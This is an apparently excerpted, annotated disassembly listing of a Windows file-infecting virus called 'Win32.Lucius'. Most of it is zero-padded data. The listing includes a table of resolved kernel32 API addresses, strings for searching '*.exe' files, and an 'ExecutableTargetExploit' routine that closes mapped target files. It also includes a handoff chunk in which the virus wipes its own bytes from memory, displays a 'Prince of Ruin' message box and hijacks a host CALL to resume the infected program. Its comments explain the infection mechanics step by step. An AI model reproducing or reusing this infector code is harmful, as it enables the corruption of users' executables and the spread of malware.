.data:0040373F                 mov     eax, [ebp+40188Ah] ; function pointer to closeHandle grabbed
.data:00403745                 call    eax             ; function called, closing file map handle
.data:00403747                 mov     eax, [ebp+401BA9h] ; handle to createFile grabbed. (did not really create the file, this was used to open it)
.data:0040374D                 push    eax             ; handle pushed
.data:0040374E                 mov     eax, [ebp+40188Ah] ; close handle function pointer grabbed
.data:00403754                 call    eax             ; function called to close file
.data:00403756                 retn                    ; return to find more files
.data:00403756 ExecutableTargetExploit endp
.data:00403756
.data:00403756 ; ---------------------------------------------------------------------------
.data:00403757                 db    0
.data:00403758                 db    0
.data:00403759                 db    0
.data:0040375A                 db    0
.data:0040375B                 db    0
.data:0040375C                 db    0
.data:0040375D                 db    0
.data:0040375E                 db    0
.data:0040375F                 db    0
.data:00403760                 db    0
.data:00403761                 db    0
.data:00403762                 db    0
.data:00403763                 db    0
.data:00403764                 db    0
.data:00403765                 db    0
.data:00403766                 db    0
.data:00403767                 db    0
.data:00403768                 db    0
.data:00403769                 db    0
.data:0040376A                 db    0
.data:0040376B                 db    0
.data:0040376C                 db    0
.data:0040376D                 db    0
.data:0040376E                 db    0
.data:0040376F                 db    0
.data:00403770                 db    0
.data:00403771                 db    0
.data:00403772                 db    0
.data:00403773 pointerToStartOfUnusedSection dd 330814h
.data:00403777 offsetToStartOfUnusedSectionData dd 3014h
.data:0040377B DifferenceRVA_RawData dd 40100Eh
.data:0040377F EndMalOrCALL    dd offset MessageBoxA   ; this has been used for a few things, at one point it held the end of the malware in a target executable
.data:0040377F                                         ; then it holds the CALL instruction found in an executable
.data:00403783                 db    0
.data:00403784 aLoadlibrary    db 'LoadLibrary',0
.data:00403790 LoadLibraryModulelocation dd 7C884F9Ch
.data:00403794 aGetprocaddress db 'GetProcAddress',0
.data:004037A3 GetProcAddressModuleLocation dd 0
.data:004037A7 aGlobalalloc    db 'GlobalAlloc',0
.data:004037B3 GlobalAllocModuleLocation dd 7C80FDCDh
.data:004037B7 aGlobalfree     db 'GlobalFree',0
.data:004037C2 GlobalFreeModuleLocation dd 7C80FCCFh
.data:004037C6 aCreatefile     db 'CreateFile',0
.data:004037D1 CreateFileModuleLocation dd 7C801A28h
.data:004037D5 aCreatefilemapp db 'CreateFileMapping',0
.data:004037E7 CreatefilemappModuleLocation dd 7C80950Ah
.data:004037EB aMapviewoffile  db 'MapViewOfFile',0
.data:004037F9 MapviewoffileModuleLocation dd 7C80B9A5h
.data:004037FD aSetcurrentdire db 'SetCurrentDirectory',0
.data:00403811 SetcurrentdireModuleLocation dd 7C83610Dh
.data:00403815 aGetcurrentproc db 'GetCurrentProcess',0
.data:00403827 GetcurrentprocModuleLocation dd 7C80DE95h
.data:0040382B aSetprioritycla db 'SetPriorityClass',0
.data:0040383C SetpriorityclaModuleLocation dd 7C82C348h
.data:00403840 aMessagebox     db 'MessageBox',0
.data:0040384B MessageboxModuleLocation dd 0
.data:0040384F aCreatemutex    db 'CreateMutex',0
.data:0040385B CreateMutexModuleLocation dd 7C80E9DFh
.data:0040385F aOpenmutex      db 'OpenMutex',0
.data:00403869 OpenMutexModuleLocation dd 7C80EABBh
.data:0040386D aReleasemutex   db 'ReleaseMutex',0
.data:0040387A ReleaseMutexModuleLocation dd 7C8024B7h
.data:0040387E aUnmapviewoffil db 'UnmapViewOfFile',0
.data:0040388E UnmapViewOfFileModuleLocation dd 7C80BA14h
.data:00403892 aClosehandle    db 'CloseHandle',0
.data:0040389E                 public CloseHandleModuleLocation
.data:0040389E CloseHandleModuleLocation dd 7C809BE7h
.data:004038A2 aGettickcount   db 'GetTickCount',0
.data:004038AF GetTickCoundModuleLocation dd 7C80934Ah
.data:004038B3 aGetfilesize    db 'GetFileSize',0
.data:004038BF GetFileSizeModuleLocation dd 7C810B17h
.data:004038C3 aFindfirstfile  db 'FindFirstFile',0
.data:004038D1 FindFirstFileModuleLocation dd 7C813879h
.data:004038D5 aGetfileattribu db 'GetFileAttributes',0
.data:004038E7 GetFileAttributesModuleLocation dd 7C8115DCh
.data:004038EB aFindnextfile   db 'FindNextFile',0
.data:004038F8 FindNextFileModuleLocation dd 7C834EE1h
.data:004038FC aFindclose      db 'FindClose',0
.data:00403906 FindCloseModuleLocation dd 7C80EE77h
.data:0040390A                 db    0
.data:0040390B                 db    0
.data:0040390C                 db    0
.data:0040390D                 db    0
.data:0040390E                 db    0
.data:0040390F                 db    0
.data:00403910                 db    0
.data:00403911                 db    0
.data:00403912                 db    0
.data:00403913                 db    0
.data:00403914                 db    0
.data:00403915                 db    0
.data:00403916                 db    0
.data:00403917                 db    0
.data:00403918                 db    0
.data:00403919                 db    0
.data:0040391A                 db    0
.data:0040391B                 db    0
.data:0040391C                 db    0
.data:0040391D                 db    0
.data:0040391E                 db    0
.data:0040391F                 db    0
.data:00403920                 db    0
.data:00403921                 db    0
.data:00403922                 db    0
.data:00403923                 db    0
.data:00403924                 db    0
.data:00403925                 db    0
.data:00403926                 db    0
.data:00403927                 db    0
.data:00403928                 db    0
.data:00403929                 db    0
.data:0040392A                 db    0
.data:0040392B                 db    0
.data:0040392C                 db    0
.data:0040392D                 db    0
.data:0040392E                 db    0
.data:0040392F                 db    0
.data:00403930                 db    0
.data:00403931                 db    0
.data:00403932                 db    0
.data:00403933                 db    0
.data:00403934                 db    0
.data:00403935                 db    0
.data:00403936                 db    0
.data:00403937                 db    0
.data:00403938                 db    0
.data:00403939                 db    0
.data:0040393A                 db    0
.data:0040393B                 db    0
.data:0040393C                 db    0
.data:0040393D                 db    0
.data:0040393E                 db    0
.data:0040393F                 db    0
.data:00403940                 db    0
.data:00403941                 db    0
.data:00403942                 db    0
.data:00403943                 db    0
.data:00403944                 db    0
.data:00403945                 db    0
.data:00403946                 db    0
.data:00403947                 db    0
.data:00403948                 db    0
.data:00403949                 db    0
.data:0040394A                 db    0
.data:0040394B                 db    0
.data:0040394C                 db    0
.data:0040394D                 db    0
.data:0040394E                 db    0
.data:0040394F                 db    0
.data:00403950                 db    0
.data:00403951                 db    0
.data:00403952                 db    0
.data:00403953                 db    0
.data:00403954                 db    0
.data:00403955                 db    0
.data:00403956                 db    0
.data:00403957                 db    0
.data:00403958                 db    0
.data:00403959                 db    0
.data:0040395A                 db    0
.data:0040395B                 db    0
.data:0040395C                 db    0
.data:0040395D                 db    0
.data:0040395E                 db    0
.data:0040395F                 db    0
.data:00403960                 db    0
.data:00403961                 db    0
.data:00403962                 db    0
.data:00403963                 db    0
.data:00403964                 db    0
.data:00403965                 db    0
.data:00403966                 db    0
.data:00403967                 db    0
.data:00403968                 db    0
.data:00403969                 db    0
.data:0040396A                 db    0
.data:0040396B                 db    0
.data:0040396C                 db    0
.data:0040396D                 db    0
.data:0040396E                 db    0
.data:0040396F                 db    0
.data:00403970                 db    0
.data:00403971                 db    0
.data:00403972                 db    0
.data:00403973                 db    0
.data:00403974                 db    0
.data:00403975                 db    0
.data:00403976                 db    0
.data:00403977                 db    0
.data:00403978                 db    0
.data:00403979                 db    0
.data:0040397A                 db    0
.data:0040397B                 db    0
.data:0040397C                 db    0
.data:0040397D                 db    0
.data:0040397E                 db    0
.data:0040397F                 db    0
.data:00403980                 db    0
.data:00403981                 db    0
.data:00403982                 db    0
.data:00403983                 db    0
.data:00403984                 db    0
.data:00403985                 db    0
.data:00403986                 db    0
.data:00403987                 db    0
.data:00403988                 db    0
.data:00403989                 db    0
.data:0040398A                 db    0
.data:0040398B                 db    0
.data:0040398C                 db    0
.data:0040398D                 db    0
.data:0040398E                 db    0
.data:0040398F                 db    0
.data:00403990                 db    0
.data:00403991                 db    0
.data:00403992                 db    0
.data:00403993                 db    0
.data:00403994                 db    0
.data:00403995                 db    0
.data:00403996                 db    0
.data:00403997                 db    0
.data:00403998                 db    0
.data:00403999                 db    0
.data:0040399A                 db    0
.data:0040399B                 db    0
.data:0040399C                 db    0
.data:0040399D                 db    0
.data:0040399E                 db    0
.data:0040399F                 db    0
.data:004039A0                 db    0
.data:004039A1                 db    0
.data:004039A2                 db    0
.data:004039A3                 db    0
.data:004039A4                 db    0
.data:004039A5                 db    0
.data:004039A6                 db    0
.data:004039A7                 db    0
.data:004039A8                 db    0
.data:004039A9                 db    0
.data:004039AA                 db    0
.data:004039AB                 db    0
.data:004039AC                 db    0
.data:004039AD                 db    0
.data:004039AE                 db    0
.data:004039AF                 db    0
.data:004039B0                 db    0
.data:004039B1                 db    0
.data:004039B2                 db    0
.data:004039B3                 db    0
.data:004039B4                 db    0
.data:004039B5                 db    0
.data:004039B6                 db    0
.data:004039B7                 db    0
.data:004039B8                 db    0
.data:004039B9                 db    0
.data:004039BA                 db    0
.data:004039BB                 db    0
.data:004039BC                 db    0
.data:004039BD                 db    0
.data:004039BE                 db    0
.data:004039BF                 db    0
.data:004039C0                 db    0
.data:004039C1                 db    0
.data:004039C2                 db    0
.data:004039C3                 db    0
.data:004039C4                 db    0
.data:004039C5                 db    0
.data:004039C6                 db    0
.data:004039C7                 db    0
.data:004039C8                 db    0
.data:004039C9                 db    0
.data:004039CA                 db    0
.data:004039CB                 db    0
.data:004039CC                 db    0
.data:004039CD                 db    0
.data:004039CE                 db    0
.data:004039CF                 db    0
.data:004039D0                 db    0
.data:004039D1                 db    0
.data:004039D2                 db    0
.data:004039D3                 db    0
.data:004039D4                 db    0
.data:004039D5                 db    0
.data:004039D6                 db    0
.data:004039D7                 db    0
.data:004039D8                 db    0
.data:004039D9                 db    0
.data:004039DA                 db    0
.data:004039DB                 db    0
.data:004039DC                 db    0
.data:004039DD                 db    0
.data:004039DE                 db    0
.data:004039DF                 db    0
.data:004039E0                 db    0
.data:004039E1                 db    0
.data:004039E2                 db    0
.data:004039E3                 db    0
.data:004039E4                 db    0
.data:004039E5                 db    0
.data:004039E6                 db    0
.data:004039E7                 db    0
.data:004039E8                 db    0
.data:004039E9                 db    0
.data:004039EA                 db    0
.data:004039EB                 db    0
.data:004039EC                 db    0
.data:004039ED                 db    0
.data:004039EE                 db    0
.data:004039EF                 db    0
.data:004039F0                 db    0
.data:004039F1                 db    0
.data:004039F2                 db    0
.data:004039F3                 db    0
.data:004039F4                 db    0
.data:004039F5                 db    0
.data:004039F6                 db    0
.data:004039F7                 db    0
.data:004039F8                 db    0
.data:004039F9                 db    0
.data:004039FA                 db    0
.data:004039FB                 db    0
.data:004039FC                 db    0
.data:004039FD                 db    0
.data:004039FE                 db    0
.data:004039FF                 db    0
.data:00403A00                 db    0
.data:00403A01                 db    0
.data:00403A02                 db    0
.data:00403A03                 db    0
.data:00403A04                 db    0
.data:00403A05                 db    0
.data:00403A06                 db    0
.data:00403A07                 db    0
.data:00403A08                 db    0
.data:00403A09                 db    0
.data:00403A0A                 db    0
.data:00403A0B                 db    0
.data:00403A0C                 db    0
.data:00403A0D                 db    0
.data:00403A0E                 db    0
.data:00403A0F                 db    0
.data:00403A10                 db    0
.data:00403A11                 db    0
.data:00403A12                 db    0
.data:00403A13                 db    0
.data:00403A14                 db    0
.data:00403A15                 db    0
.data:00403A16                 db    0
.data:00403A17                 db    0
.data:00403A18                 db    0
.data:00403A19                 db    0
.data:00403A1A                 db    0
.data:00403A1B                 db    0
.data:00403A1C                 db    0
.data:00403A1D                 db    0
.data:00403A1E                 db    0
.data:00403A1F                 db    0
.data:00403A20                 db    0
.data:00403A21                 db    0
.data:00403A22                 db    0
.data:00403A23                 db    0
.data:00403A24                 db    0
.data:00403A25                 db    0
.data:00403A26                 db    0
.data:00403A27                 db    0
.data:00403A28                 db    0
.data:00403A29                 db    0
.data:00403A2A                 db    0
.data:00403A2B                 db    0
.data:00403A2C                 db    0
.data:00403A2D                 db    0
.data:00403A2E                 db    0
.data:00403A2F                 db    0
.data:00403A30                 db    0
.data:00403A31                 db    0
.data:00403A32                 db    0
.data:00403A33                 db    0
.data:00403A34                 db    0
.data:00403A35                 db    0
.data:00403A36                 db    0
.data:00403A37                 db    0
.data:00403A38                 db    0
.data:00403A39                 db    0
.data:00403A3A                 db    0
.data:00403A3B                 db    0
.data:00403A3C                 db    0
.data:00403A3D                 db    0
.data:00403A3E                 db    0
.data:00403A3F                 db    0
.data:00403A40                 db    0
.data:00403A41                 db    0
.data:00403A42                 db    0
.data:00403A43                 db    0
.data:00403A44                 db    0
.data:00403A45                 db    0
.data:00403A46                 db    0
.data:00403A47                 db    0
.data:00403A48                 db    0
.data:00403A49                 db    0
.data:00403A4A                 db    0
.data:00403A4B                 db    0
.data:00403A4C                 db    0
.data:00403A4D                 db    0
.data:00403A4E                 db    0
.data:00403A4F                 db    0
.data:00403A50                 db    0
.data:00403A51                 db    0
.data:00403A52                 db    0
.data:00403A53                 db    0
.data:00403A54                 db    0
.data:00403A55                 db    0
.data:00403A56                 db    0
.data:00403A57                 db    0
.data:00403A58                 db    0
.data:00403A59                 db    0
.data:00403A5A                 db    0
.data:00403A5B                 db    0
.data:00403A5C                 db    0
.data:00403A5D                 db    0
.data:00403A5E                 db    0
.data:00403A5F                 db    0
.data:00403A60                 db    0
.data:00403A61                 db    0
.data:00403A62                 db    0
.data:00403A63                 db    0
.data:00403A64                 db    0
.data:00403A65                 db    0
.data:00403A66                 db    0
.data:00403A67                 db    0
.data:00403A68                 db    0
.data:00403A69                 db    0
.data:00403A6A                 db    0
.data:00403A6B                 db    0
.data:00403A6C                 db    0
.data:00403A6D                 db    0
.data:00403A6E                 db    0
.data:00403A6F                 db    0
.data:00403A70                 db    0
.data:00403A71                 db    0
.data:00403A72                 db    0
.data:00403A73                 db    0
.data:00403A74                 db    0
.data:00403A75                 db    0
.data:00403A76                 db    0
.data:00403A77                 db    0
.data:00403A78                 db    0
.data:00403A79                 db    0
.data:00403A7A                 db    0
.data:00403A7B                 db    0
.data:00403A7C                 db    0
.data:00403A7D                 db    0
.data:00403A7E                 db    0
.data:00403A7F                 db    0
.data:00403A80                 db    0
.data:00403A81                 db    0
.data:00403A82                 db    0
.data:00403A83                 db    0
.data:00403A84                 db    0
.data:00403A85                 db    0
.data:00403A86                 db    0
.data:00403A87                 db    0
.data:00403A88                 db    0
.data:00403A89                 db    0
.data:00403A8A                 db    0
.data:00403A8B                 db    0
.data:00403A8C                 db    0
.data:00403A8D                 db    0
.data:00403A8E                 db    0
.data:00403A8F                 db    0
.data:00403A90                 db    0
.data:00403A91                 db    0
.data:00403A92                 db    0
.data:00403A93                 db    0
.data:00403A94                 db    0
.data:00403A95                 db    0
.data:00403A96                 db    0
.data:00403A97                 db    0
.data:00403A98 aUser32         db 'user32',0
.data:00403A9F aWsock32        db 'wsock32',0
.data:00403AA7 aPetestExe      db 'petest.exe',0
.data:00403AB2                 db    0
.data:00403AB3                 db    0
.data:00403AB4                 db    0
.data:00403AB5                 db    0
.data:00403AB6                 db    0
.data:00403AB7                 db    0
.data:00403AB8                 db    0
.data:00403AB9                 db    0
.data:00403ABA                 db    0
.data:00403ABB                 db    0
.data:00403ABC                 db    0
.data:00403ABD                 db    0
.data:00403ABE                 db    0
.data:00403ABF                 db    0
.data:00403AC0                 db    0
.data:00403AC1                 db    0
.data:00403AC2                 db    0
.data:00403AC3                 db    0
.data:00403AC4                 db    0
.data:00403AC5                 db    0
.data:00403AC6                 db    0
.data:00403AC7                 db    0
.data:00403AC8                 db    0
.data:00403AC9                 db    0
.data:00403ACA                 db    0
.data:00403ACB                 db    0
.data:00403ACC                 db    0
.data:00403ACD                 db    0
.data:00403ACE                 db    0
.data:00403ACF                 db    0
.data:00403AD0                 db    0
.data:00403AD1                 db    0
.data:00403AD2                 db    0
.data:00403AD3                 db    0
.data:00403AD4                 db    0
.data:00403AD5                 db    0
.data:00403AD6                 db    0
.data:00403AD7                 db    0
.data:00403AD8                 db    0
.data:00403AD9                 db    0
.data:00403ADA                 db    0
.data:00403ADB                 db    0
.data:00403ADC                 db    0
.data:00403ADD                 db    0
.data:00403ADE                 db    0
.data:00403ADF                 db    0
.data:00403AE0                 db    0
.data:00403AE1                 db    0
.data:00403AE2                 db    0
.data:00403AE3                 db    0
.data:00403AE4                 db    0
.data:00403AE5                 db    0
.data:00403AE6                 db    0
.data:00403AE7                 db    0
.data:00403AE8                 db    0
.data:00403AE9                 db    0
.data:00403AEA                 db    0
.data:00403AEB                 db    0
.data:00403AEC                 db    0
.data:00403AED                 db    0
.data:00403AEE                 db    0
.data:00403AEF                 db    0
.data:00403AF0                 db    0
.data:00403AF1                 db    0
.data:00403AF2                 db    0
.data:00403AF3                 db    0
.data:00403AF4                 db    0
.data:00403AF5                 db    0
.data:00403AF6                 db    0
.data:00403AF7                 db    0
.data:00403AF8                 db    0
.data:00403AF9                 db    0
.data:00403AFA                 db    0
.data:00403AFB                 db    0
.data:00403AFC                 db    0
.data:00403AFD                 db    0
.data:00403AFE                 db    0
.data:00403AFF                 db    0
.data:00403B00                 db    0
.data:00403B01                 db    0
.data:00403B02                 db    0
.data:00403B03                 db    0
.data:00403B04                 db    0
.data:00403B05                 db    0
.data:00403B06                 db    0
.data:00403B07                 db    0
.data:00403B08                 db    0
.data:00403B09                 db    0
.data:00403B0A                 db    0
.data:00403B0B                 db    0
.data:00403B0C                 db    0
.data:00403B0D                 db    0
.data:00403B0E                 db    0
.data:00403B0F                 db    0
.data:00403B10                 db    0
.data:00403B11                 db    0
.data:00403B12                 db    0
.data:00403B13                 db    0
.data:00403B14                 db    0
.data:00403B15                 db    0
.data:00403B16                 db    0
.data:00403B17                 db    0
.data:00403B18                 db    0
.data:00403B19                 db    0
.data:00403B1A                 db    0
.data:00403B1B                 db    0
.data:00403B1C                 db    0
.data:00403B1D                 db    0
.data:00403B1E                 db    0
.data:00403B1F                 db    0
.data:00403B20                 db    0
.data:00403B21                 db    0
.data:00403B22                 db    0
.data:00403B23                 db    0
.data:00403B24                 db    0
.data:00403B25                 db    0
.data:00403B26                 db    0
.data:00403B27                 db    0
.data:00403B28                 db    0
.data:00403B29                 db    0
.data:00403B2A                 db    0
.data:00403B2B                 db    0
.data:00403B2C                 db    0
.data:00403B2D                 db    0
.data:00403B2E                 db    0
.data:00403B2F                 db    0
.data:00403B30                 db    0
.data:00403B31                 db    0
.data:00403B32                 db    0
.data:00403B33                 db    0
.data:00403B34                 db    0
.data:00403B35                 db    0
.data:00403B36                 db    0
.data:00403B37                 db    0
.data:00403B38                 db    0
.data:00403B39                 db    0
.data:00403B3A                 db    0
.data:00403B3B                 db    0
.data:00403B3C                 db    0
.data:00403B3D                 db    0
.data:00403B3E                 db    0
.data:00403B3F                 db    0
.data:00403B40                 db    0
.data:00403B41                 db    0
.data:00403B42                 db    0
.data:00403B43                 db    0
.data:00403B44                 db    0
.data:00403B45                 db    0
.data:00403B46                 db    0
.data:00403B47                 db    0
.data:00403B48                 db    0
.data:00403B49                 db    0
.data:00403B4A                 db    0
.data:00403B4B                 db    0
.data:00403B4C                 db    0
.data:00403B4D                 db    0
.data:00403B4E                 db    0
.data:00403B4F                 db    0
.data:00403B50                 db    0
.data:00403B51                 db    0
.data:00403B52                 db    0
.data:00403B53                 db    0
.data:00403B54                 db    0
.data:00403B55                 db    0
.data:00403B56                 db    0
.data:00403B57                 db    0
.data:00403B58                 db    0
.data:00403B59                 db    0
.data:00403B5A                 db    0
.data:00403B5B                 db    0
.data:00403B5C                 db    0
.data:00403B5D                 db    0
.data:00403B5E                 db    0
.data:00403B5F                 db    0
.data:00403B60                 db    0
.data:00403B61                 db    0
.data:00403B62                 db    0
.data:00403B63                 db    0
.data:00403B64                 db    0
.data:00403B65                 db    0
.data:00403B66                 db    0
.data:00403B67                 db    0
.data:00403B68                 db    0
.data:00403B69                 db    0
.data:00403B6A                 db    0
.data:00403B6B                 db    0
.data:00403B6C                 db    0
.data:00403B6D                 db    0
.data:00403B6E                 db    0
.data:00403B6F                 db    0
.data:00403B70                 db    0
.data:00403B71                 db    0
.data:00403B72                 db    0
.data:00403B73                 db    0
.data:00403B74                 db    0
.data:00403B75                 db    0
.data:00403B76                 db    0
.data:00403B77                 db    0
.data:00403B78                 db    0
.data:00403B79                 db    0
.data:00403B7A                 db    0
.data:00403B7B                 db    0
.data:00403B7C                 db    0
.data:00403B7D                 db    0
.data:00403B7E                 db    0
.data:00403B7F                 db    0
.data:00403B80                 db    0
.data:00403B81                 db    0
.data:00403B82                 db    0
.data:00403B83                 db    0
.data:00403B84                 db    0
.data:00403B85                 db    0
.data:00403B86                 db    0
.data:00403B87                 db    0
.data:00403B88                 db    0
.data:00403B89                 db    0
.data:00403B8A                 db    0
.data:00403B8B                 db    0
.data:00403B8C                 db    0
.data:00403B8D                 db    0
.data:00403B8E                 db    0
.data:00403B8F                 db    0
.data:00403B90                 db    0
.data:00403B91                 db    0
.data:00403B92                 db    0
.data:00403B93                 db    0
.data:00403B94                 db    0
.data:00403B95                 db    0
.data:00403B96                 db    0
.data:00403B97                 db    0
.data:00403B98                 db    0
.data:00403B99                 db    0
.data:00403B9A                 db    0
.data:00403B9B                 db    0
.data:00403B9C                 db    0
.data:00403B9D                 db    0
.data:00403B9E                 db    0
.data:00403B9F                 db    0
.data:00403BA0                 db    0
.data:00403BA1                 db    0
.data:00403BA2                 db    0
.data:00403BA3                 db    0
.data:00403BA4                 db    0
.data:00403BA5                 db    0
.data:00403BA6                 db    0
.data:00403BA7                 db    0
.data:00403BA8                 db    0
.data:00403BA9                 db    0
.data:00403BAA                 db    0
.data:00403BAB                 db    0
.data:00403BAC                 db    0
.data:00403BAD                 db    0
.data:00403BAE                 db    0
.data:00403BAF                 db    0
.data:00403BB0                 db    0
.data:00403BB1                 db    0
.data:00403BB2                 db    0
.data:00403BB3                 db    0
.data:00403BB4                 db    0
.data:00403BB5                 db    0
.data:00403BB6                 db '..',0
.data:00403BB9                 db '*.*',0
.data:00403BBD createFileResult dd 7E0h
.data:00403BC1 MappingFileResult dd 7D8h
.data:00403BC5 MappingViewHandle dd 330000h
.data:00403BC9 user32LibraryHandle dd 0
.data:00403BCD                 db    0
.data:00403BCE                 db    0
.data:00403BCF                 db  80h ; �
.data:00403BD0                 db  7Ch ; |
.data:00403BD1                 db    0
.data:00403BD2                 db    0
.data:00403BD3                 db    0
.data:00403BD4                 db    0
.data:00403BD5 numberOfSections dd 3
.data:00403BD9 ImageOptionalHeaderPointer dd 3300E0h
.data:00403BDD StartAddressValue dd 1000h
.data:00403BE1 RawDataPlusImageBase dd 330400h
.data:00403BE5 imageBased      dd 400000h
.data:00403BE9                 db 0C0h ; �
.data:00403BEA                 db    1
.data:00403BEB                 db  33h ; 3
.data:00403BEC                 db    0
.data:00403BED fileAllignment  dd 200h
.data:00403BF1 sectionAllignment dd 1000h              ; stored20hByteIntoEntry
.data:00403BF5                 db    0
.data:00403BF6                 db    0
.data:00403BF7                 db    0
.data:00403BF8                 db    0
.data:00403BF9 GetTickCountResult dd 316AAA8Ah
.data:00403BFD                 db    0
.data:00403BFE                 db    0
.data:00403BFF                 db    0
.data:00403C00                 db    0
.data:00403C01                 db '*.*',0
.data:00403C05 BackOutOfDirectory db '..',0
.data:00403C08 aDanger         db 'danger',0
.data:00403C0F                 db    0
.data:00403C10                 db    0
.data:00403C11                 db    0
.data:00403C12                 db    0
.data:00403C13 aExe            db '*.exe',0
.data:00403C19                 db  2Eh ; .
.data:00403C1A                 db  2Eh ; .
.data:00403C1B                 db    0
.data:00403C1C FileNameString  dw 2FE4h
.data:00403C1E                 db  14h
.data:00403C1F                 db    0
.data:00403C20                 db  31h ; 1
.data:00403C21                 db  26h ; &
.data:00403C22                 db    0
.data:00403C23                 db    0
.data:00403C24 textHeaderSectionPointer dd 3301C0h
.data:00403C28 ; ---------------------------------------------------------------------------
.data:00403C28 ; START OF FUNCTION CHUNK FOR LuciusStart
.data:00403C28
.data:00403C28 PreHandoff:                             ; CODE XREF: LuciusStart+2F9\u2191j
.data:00403C28                 lea     eax, [ebp+401A84h] ; strings user32 is pushed to stack
.data:00403C2E                 push    eax             ; pushed as parameter
.data:00403C2F                 mov     eax, [ebp+40177Ch] ; load library function pointer is grabbed
.data:00403C35                 call    eax             ; LoadLibrary is called
.data:00403C37                 mov     [ebp+401BB5h], eax ; library handler is stored
.data:00403C3D                 lea     esi, [ebp+40182Ch] ; string pointer for "MessageBoxA" is set up for the SearchModule
.data:00403C43                 call    searchModule    ; this function call will leave the function pointer for MessageBoxA in eax
.data:00403C48                 mov     [ebp+401837h], eax ; function pointer for MessageBox is stored for later
.data:00403C4E                 push    0               ; owner of this text box is NULL
.data:00403C50                 lea     eax, [ebp+401C67h] ; pointer to "win32.lucius" for the text of the message box
.data:00403C56                 push    eax             ; pushes as parameter
.data:00403C57                 lea     eax, [ebp+401C74h] ; loads the "...I am lucius, prince of ruin" string as the caption for the messagebox
.data:00403C5D                 push    eax             ; push as parameter
.data:00403C5E                 push    0               ; the type of this message box is the one that only has "OK" on it
.data:00403C60                 mov     eax, [ebp+401837h] ; MessageBox function pointer loaded
.data:00403C66                 push    eax             ; pushed, it will be popped back in after obfuscating itself
.data:00403C67                 lea     edi, [ebp+401000h] ; loads the start address of the malware on this host (in memory)
.data:00403C6D                 mov     ecx, 0C62h      ; approximately the number of bytes in this malware is loaded into the count register
.data:00403C72                 mov     al, 0           ; we want to 0 out all the bytes
.data:00403C74                 rep stosb               ; write 0 to all the bytes starting at the malware's start until about its end
.data:00403C76                 pop     eax             ; restore eax (MessageBoxA function pointer)
.data:00403C77                 call    eax             ; calls MessageBox with the Lucius text
.data:00403C79                 jmp     short returnControlToHost
.data:00403C79 ; END OF FUNCTION CHUNK FOR LuciusStart
.data:00403C79 ; ---------------------------------------------------------------------------
.data:00403C7B aWin32Lucius    db 'Win32.Lucius',0
.data:00403C88 aIAmLuciusPrinc db '...I am Lucius, Prince of Ruin...',0
.data:00403CAA ; ---------------------------------------------------------------------------
.data:00403CAA ; START OF FUNCTION CHUNK FOR LuciusStart
.data:00403CAA
.data:00403CAA returnControlToHost:                    ; CODE XREF: LuciusStart+C65\u2191j
.data:00403CAA                 push    offset MessageBoxA ; pushes the address of what the host was originally trying to call
.data:00403CAA                                         ; this is not always "MessageBoxA" but is dynamically generated based on what Lucius finds
.data:00403CAF                 retn                    ; that pushed value is loaded into eip
.data:00403CAF ; END OF FUNCTION CHUNK FOR LuciusStart ; and instruction picks up at the intended recipient of the CALL
.data:00403CAF                                         ; the stack remains in the state it was in before Lucius picked up, so execution of the called function should be normal
.data:00403CAF                                         ; and it will return to the host after completion.
.data:00403CAF ; ---------------------------------------------------------------------------
.data:00403CB0                 db  0Fh
.data:00403CB1                 db 0C5h ; �
.data:00403CB2                 db  15h
.data:00403CB3                 db    9
.data:00403CB4                 db  4Fh ; O
.data:00403CB5                 db  56h ; V
.data:00403CB6                 db  25h ; %
.data:00403CB7                 db  17h
.data:00403CB8                 db  7Dh ; }
.data:00403CB9                 db 0A3h ; �
.data:00403CBA                 db 0A2h ; �
.data:00403CBB                 db    8
.data:00403CBC                 db  4Ch ; L
.data:00403CBD                 db  51h ; Q
.data:00403CBE                 db 0E1h ; �
.data:00403CBF                 db    4
.data:00403CC0                 db 0FAh ; �
.data:00403CC1                 db  46h ; F
.data:00403CC2                 db  89h ; �
.data:00403CC3                 db    7
.data:00403CC4                 db  28h ; (
.data:00403CC5                 db  5Dh ; ]
.data:00403CC6                 db  64h ; d
.data:00403CC7                 db  0Bh
.data:00403CC8                 db  5Ch ; \
.data:00403CC9                 db 0CAh ; �
.data:00403CCA                 db  65h ; e
.data:00403CCB                 db    1
.data:00403CCC                 db  10h
.data:00403CCD                 db 0D9h ; �
.data:00403CCE                 db  99h ; �
.data:00403CCF                 db    7
.data:00403CD0                 db  2Dh ; -
.data:00403CD1                 db 0CBh ; �
.data:00403CD2                 db  79h ; y
.data:00403CD3                 db    5
.data:00403CD4                 db 0B3h ; �
.data:00403CD5                 db    6
.data:00403CD6                 db 0ADh ; �
.data:00403CD7                 db  0Ah
.data:00403CD8                 db  3Ch ; <
.data:00403CD9                 db 0B5h ; �
.data:00403CDA                 db  7Bh ; {
.data:00403CDB                 db    8
.data:00403CDC                 db 0B1h ; �
.data:00403CDD                 db  7Bh ; {
.data:00403CDE                 db 0FDh ; �
.data:00403CDF                 db    8
.data:00403CE0                 db    2
.data:00403CE1                 db  21h ; !
.data:00403CE2                 db  38h ; 8
.data:00403CE3                 db  0Bh
.data:00403CE4                 db  44h ; D
.data:00403CE5                 db  33h ; 3
.data:00403CE6                 db  5Ch ; \
.data:00403CE7                 db    6
.data:00403CE8                 db 0A4h ; �
.data:00403CE9                 db 0FFh ; �
.data:00403CEA                 db  86h ; �
.data:00403CEB                 db    3
.data:00403CEC                 db    0
.data:00403CED                 db  8Dh
.data:00403CEE                 db  56h ; V
.data:00403CEF                 db    8
.data:00403CF0                 db  7Ah ; z
.data:00403CF1                 db    0
.data:00403CF2                 db  89h ; �
.data:00403CF3                 db    1
.data:00403CF4                 db    0
.data:00403CF5                 db    0
.data:00403CF6                 db    0
.data:00403CF7                 db    0
.data:00403CF8                 db    0
.data:00403CF9                 db    0
.data:00403CFA                 db    0
.data:00403CFB                 db    0
.data:00403CFC                 db    0
.data:00403CFD                 db    0
.data:00403CFE                 db    0
.data:00403CFF                 db    0
.data:00403D00                 db    0
.data:00403D01                 db    0
.data:00403D02                 db    0
.data:00403D03                 db    0
.data:00403D04                 db    0
.data:00403D05                 db    0
.data:00403D06                 db    0
.data:00403D07                 db    0
.data:00403D08                 db    0
.data:00403D09                 db    0
.data:00403D0A                 db    0
.data:00403D0B                 db    0
.data:00403D0C                 db    0
.data:00403D0D                 db    0
.data:00403D0E                 db    0
.data:00403D0F                 db    0
.data:00403D10                 db    0
.data:00403D11                 db    0
.data:00403D12                 db    0
.data:00403D13                 db    0
.data:00403D14                 db    0
.data:00403D15                 db    0
.data:00403D16                 db    0
.data:00403D17                 db    0
.data:00403D18                 db    0
